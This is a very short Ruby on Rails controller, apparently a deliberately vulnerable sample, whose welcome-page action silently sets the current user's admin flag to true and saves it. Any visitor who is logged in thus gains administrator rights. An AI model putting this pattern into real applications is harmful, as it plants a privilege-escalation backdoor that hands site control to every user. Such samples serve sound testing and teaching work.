class WelcomeController < ApplicationController
  def index
    current_user.admin = true
    current_user.save
  end
end